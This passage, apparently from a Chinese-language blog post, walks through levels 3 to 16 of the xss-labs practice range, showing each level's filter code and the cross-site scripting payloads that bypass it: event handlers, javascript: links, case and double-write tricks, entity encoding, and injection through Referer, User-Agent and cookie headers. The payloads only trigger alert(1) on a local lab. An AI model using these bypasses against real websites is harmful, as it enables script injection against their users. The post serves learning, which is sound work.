+<li>&lt;：转换为&lt;</li>
+<li>&lsquo;&gt;：转换为&gt;</li>
+</ol>
+<p>语法<code>htmlspecialchars(string,flags,character-set,double_encode)</code></p>
+<ul>
+<li>string：必需，规定要转换的字符串</li>
+<li>flags ：可选，规定如何处理引号、无效的编码以及使用哪种文档类型</li>
+<li>character-set ：可选，一个规定了要使用的字符集的字符串，如：UTF-8（默认）</li>
+<li>double_encode ：可选，布尔值，规定了是否编码已存在的 HTML 实体。</li>
+</ul>
+<p>flags参数可用的引号类型</p>
+<ul>
+<li>ENT_COMPAT ：默认仅编码双引号。</li>
+<li>ENT_QUOTES：编码双引号和单引号。</li>
+<li>ENT_NOQUOTES：不编码任何引号。
+注：xss-lab中有些关卡可以利用单引号绕过是因为flags参数默认只编码双引号</li>
+</ul>
+<p>double_encode参数布尔值</p>
+<ul>
+<li>TRUE：默认，将对每个实体进行转换。</li>
+<li>FALSE：不会对已存在的 HTML 实体进行编码。</li>
+</ul>
+<p>这里靶场用的是<code>htmlspecialchars($str)</code>，尝试输入pyload，发现
+<code>&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</code>，然而，可以发现这里 value 的值用的是单引号。既然单引号不会被转义，我们可以闭合 value 这个字符串。</p>
+<p>但是，<code>&lt;&gt;</code> 都会被转义，似乎不能闭合这个标签。有什么办法能够不用 <code>&lt;script&gt;</code> 标签来注入 JavaScript 代码呢？答案是使用触发器，比如 <code>onfocus</code> 或者 <code>onmouseover</code>。</p>
+<p><code>javascript:alert(1)</code> 使用了java伪协议，就是把<code>javascript:</code> 后面的代码当JavaScript来执行
+<code>onmouseover=javascript:alert(1)</code>
+<code>onfocus=javascript:alert(1)</code></p>
+<p><strong>level4</strong><br>
+payload打进去，回显<code>&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/scrpit&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</code>
+把<code>&lt;</code>给过滤了，双引号没过滤，把上一个代码改一下扔进去试试，合理
+<code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<p><strong>level5</strong><br>
+老规矩，输入payload，返回<code>&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/scrpit&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;</code>，
+而且输入框中变成了<code>&lt;scr_ipt&gt;alert(1)&lt;/scrpit&gt;</code>，
+输入<code>&quot;&gt;&quot; onmouseover=javascript:alert(1) &quot;</code>，发现变成<code>&quot; o_nmouseover=javascript:alert(1) &quot;&quot;&gt; </code></p>
+<p>正确思路是可以利用 JavaScript 的 URI
+<code>&lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></p>
+<p><code>&lt;a&gt;</code>标签后面的href不一定非要跟url，还可以是URI，可以视为 URL 的超集，后面跟<code>javascript</code>就可以执行后面的内容，<code>mailto</code>就会去打开邮件去发信息，所以可以借助这个运行js代码
+<code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code></p>
+<p><strong>level6</strong><br>
+尝试payload，发现变成<code>&lt;scr_ipt&gt;alert(1)&lt;/scrpit&gt;</code>，尝试5的payload，发现变成<code>&lt;a hr_ef=javascript:alert(1)&gt;hack&lt;/a&gt;&quot;&gt;</code>，发现href被过滤了，课源码，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$str2=str_replace(&#34;&lt;script&#34;,&#34;&lt;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现过滤了五个东西，可以利用html的特性，HREF和href的效果是一样的，大小写不会区分
+<code>&quot;&gt; &lt;a HREF=javascript:alert(1)&gt;hack&lt;/a&gt;</code></p>
+<p><strong>level7</strong><br>
+尝试输入payload，发现回显<code>&lt;&gt;alert(1)&lt;/scrpit&gt;</code>，整个被替换为空了，那么6的payload当然不能使用了，看题目源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;&#34;,$str5);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>果然全部换为空，但是php特性，替换只会替换一个，比如<code>&lt;scriscriptpt&gt;</code>就会被替换为<code>&lt;script&gt;</code>，这就是双写绕过？
+<code>&quot;&gt; &lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</code></p>
+<p><strong>level8</strong><br>
+尝试原始payload，发现会被替换<code>&lt;scr_ipt&gt;alert(1)&lt;/scr_ipt&gt;</code>，并且是链接形式，好像没啥区别，看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span><span class="line"><span class="cl">$str7=str_replace(&#39;&#34;&#39;,&#39;&amp;quot&#39;,$str6);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新增的是双引号被过滤了，
+<code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code>进去变成<code>&lt;a hr_ef=javascr_ipt:alert(1)&gt;hack&lt;/a&gt;</code>，href可以通过大写绕过，但是javascript怎么搞</p>
+<p>HTML 实体有两种写法，第一种是 &amp;entity_name; 形式，比如 <code>$lt;</code> 表示小于号，&rdquo;&amp;&ldquo;开头，&rdquo;;&ldquo;结尾；第二种是 &amp;#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 <code>&amp;#60;</code> 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。https://mothereff.in/html-entities 可以提供转换，&rdquo;&amp;#&ldquo;开头，&rdquo;;&ldquo;结尾</p>
+<p>突然想起来这个是要加入到链接的，HREF不用写的
+<code>javascr&amp;#x69;pt:alert(1)</code></p>
+<p><strong>level9</strong><br>
+尝试上一题的payload，回显<code>&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;</code>，看看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span><span class="line"><span class="cl">$str7=str_replace(&#39;&#34;&#39;,&#39;&amp;quot&#39;,$str6);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">false===strpos($str7,&#39;http://&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>与上一题不同的就是添加了对http的验证,我们在后面加上注释，写上http://就行了
+<code>javascr&amp;#x69;pt:alert(1)//http://</code></p>
+<h3 id="level1016字段注入">level10~16(字段注入)</h3>
+<p><strong>level10</strong><br>
+尝试老payload，发现无特别回显，看看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = $_GET[&#34;keyword&#34;];
+</span></span><span class="line"><span class="cl">$str11 = $_GET[&#34;t_sort&#34;];
+</span></span><span class="line"><span class="cl">$str22=str_replace(&#34;&gt;&#34;,&#34;&#34;,$str11);
+</span></span><span class="line"><span class="cl">$str33=str_replace(&#34;&lt;&#34;,&#34;&#34;,$str22);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;form id=search&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_link&#34;  value=&#34;&#39;.&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_history&#34;  value=&#34;&#39;.&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_sort&#34;  value=&#34;&#39;.$str33.&#39;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试所有内容输入<code>http://localhost:51142/level10.php?keyword=test?t_link=tlink&amp;t_history=thistory&amp;t_sort=tsort</code> ，得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;input name=&#34;t_link&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_history&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_sort&#34;  value=&#34;tsort&#34; type=&#34;hidden&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>t_sort</code>的信息并没有过滤，可以尝试从这里注入，从源码得知<code>&lt;&gt;</code>被过滤掉，尝试类似<code>&quot; onmouseover=javascript:alert(1) &quot;</code>的payload
+<code>http://localhost:51142/level10.php?keyword=test&amp;t_sort=&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<p>发现回显
+<code>&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; onmouseover=javascript:alert(1) &quot;&quot; type=&quot;hidden&quot;&gt;</code> ,被隐藏了xd，html里面加一个type去覆盖这个状态
+<code>http://localhost:51142/level10.php?keyword=test&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</code></p>
+<p><strong>level11</strong><br>
+看页面源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;input name=&#34;t_link&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_history&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_sort&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_ref&#34;  value=&#34;http://localhost:51142/level10.php?keyword=test&amp;t_sort=%22%20onmouseover=javascript:alert(1)%20type%20%22&#34; type=&#34;hidden&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现referer被传回来，是上一个靶场的链接，bp抓包给他改了传回去
+<code>Referer: &quot;type=&quot;text &quot;onmousemove=&quot;alert(1)</code></p>
+<p>还有一种方法创建一个文件名为 <code>&quot; onmouseover=javascript:alert(1) type &quot;.html </code>的 HTML 文件，在其中重定向到 level 11 的页面。</p>
+<p><strong>level12</strong><br>
+看看页面源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;input name=&#34;t_link&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_history&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_sort&#34;  value=&#34;&#34; type=&#34;hidden&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;t_ua&#34;  value=&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15&#34; type=&#34;hidden&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>给了ua，很明显举要改ua，改成<code>&quot;type=&quot;text &quot;onmousemove=&quot;alert(1)</code>就行</p>
+<p><strong>level13</strong><br>
+修改cookie为<code>&quot; onmouseover=javascript:alert(1) type &quot;</code></p>
+<p><strong>level14</strong><br>
+貌似这个关卡寄了，看别人的博客貌似是exif xss，就是图片上传，图片的属性改成xss的马</p>
+<p><strong>level15</strong><br>
+这一关考的是<code>ng-include:</code>这个东西，文件包含</p>
+<ul>
+<li>ng-include 指令用于包含外部的 HTML 文件。</li>
+<li>包含的内容将作为指定元素的子节点。</li>
+<li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li>
+<li>默认情况下，包含的文件需要包含在同一个域名下。</li>
+</ul>
+<p>语法
+<code>&lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt;</code></p>
+<p>第一种做法，把以前关卡的漏洞包含进去，我们就可以打了</p>
+<p>第二种方法，写一个能够弹窗的简单 HTML，然后 include 进来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;hacker&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;img src=1 onerror=&#34;alert(1)&#34;&gt;&lt;/img&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果放在网站根目录，就是<code>?src=&quot;/alert.html&quot;</code>
+感觉这种遇到的可能性很小</p>
+<p><strong>level16</strong><br>
+看下面源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;&amp;nbsp;&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34; &#34;,&#34;&amp;nbsp;&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;/&#34;,&#34;&amp;nbsp;&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;	&#34;,&#34;&amp;nbsp;&#34;,$str4);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还是过滤类型的，空格和srcipt都没了，主要是空格，html里面换行符可以替换掉空格，%0A</p>
+<p><code>http://localhost:51142/level16.php?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</code></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-05-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/study_xss/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://www.zhuangsanmeng.xyz/study_xss/" data-title="Study_xss" data-hashtags="study"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://www.zhuangsanmeng.xyz/study_xss/" data-hashtag="study"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://www.zhuangsanmeng.xyz/study_xss/" data-title="Study_xss"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://www.zhuangsanmeng.xyz/study_xss/" data-title="Study_xss"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://www.zhuangsanmeng.xyz/study_xss/" data-title="Study_xss"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/study/">Study</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/about51/" class="prev" rel="prev" title="五一长假vue3&#43;nodejs全栈项目复盘"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>五一长假vue3+nodejs全栈项目复盘</a>
+            <a href="/huangheliuyu/" class="next" rel="next" title="黄河流域CTF-crypto">黄河流域CTF-crypto<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src=''></script>
+
+    <script type="text/javascript">
+        new Valine({
+            el: '#valine',
+            appId: 'XiJ1G58psCdX6BgfE27O7IH9-MdYXbMMI',
+            appKey: 'e9j5fWZui0l2YfNwupu7SDW2',
+            notify: '',
+            verify: '',
+            avatar: 'mp',
+            placeholder: '留下你的评论～',
+            visitor: 'true'
+        });
+    </script></div></article></div>
+            </main><footer class="footer">
+    <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer"
+                title="Hugo 0.147.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank"
+                rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw"
+                    aria-hidden="true"></i> LoveIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a
+                    href="/" target="_blank">Zsm</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br" />
+            <span class="icp">豫ICP备2024048128号</span></div>
+    
+        
+        <script async src=" //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js "></script>
+    
+
+    
+        
+            <section>
+                
+                    <span id="busuanzi_container_value_site_pv"><i class="far fa-eye fa-fw"></i>
+                        
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+
+                
+                    &nbsp;|&nbsp;              
+                
+
+                
+                    <span id="busuanzi_container_value_site_uv"><i class="fa fa-user"></i>
+                        
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+            </section>
+        
+
+        
+        
+    
+
+</div>
+</footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
